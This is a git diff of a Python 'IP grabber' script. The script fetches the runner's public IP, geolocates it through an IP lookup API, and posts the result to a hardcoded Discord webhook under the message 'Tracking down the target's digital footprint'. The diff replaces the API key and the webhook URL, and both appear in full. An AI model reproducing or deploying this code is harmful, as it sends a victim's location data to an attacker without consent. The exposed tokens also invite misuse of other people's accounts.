@@ -9,7 +9,7 @@ def b():
     return requests.get('https://api.ipify.org/').text
 
 def i():
-    return requests.get(f'http://extreme-ip-lookup.com/json/{b()}?key=9OIrviWeSJxhxxR8oOCI').json() #Your API Key WILL GO HERE AFTER key=
+    return requests.get(f'http://extreme-ip-lookup.com/json/{b()}?key=7ii8sdMHuJR74x8bF9Ps').json() #Your API Key WILL GO HERE AFTER key=
 
 def f(a):
     g = Embed(title="IP Information", description="Tracking down the target's digital footprint...", color=0xFF0000)
@@ -38,7 +38,7 @@ def f(a):
 
 def main():
     a = "```diff\n-█░░ █ █▄░█ █░█ ▀▄▀   +█▀█ █░█ ▄▀█ █▄░█ ▀█▀ █▀█ █▀▄▀█ \n-█▄▄ █ █░▀█ █▄█ █░█   +█▀▀ █▀█ █▀█ █░▀█ ░█░ █▄█ █░▀░█ \n+                        +Linux Phantom IP Grabber ©+\n```"
-    h = "https://discord.com/api/webhooks/1136811328212828190/qUki18tSz3FCU7-wB6yYPusiGmPRlFuhSQsgF68eJ_foEbZnuwXhBI83Mb5hqufNIa9N"  # REPLACE WITH YOUR WEBHOOK
+    h = "https://discord.com/api/webhooks/1297348718885863466/GRVd6ra5m64BFCxa9_Tb2nqZx82T90vohQ2_0bhiM1q64M2LPvakhiC0kaygA68MwMxr"  # REPLACE WITH YOUR WEBHOOK
     j = Webhook(h)
     j.send(a)
     time.sleep(3)
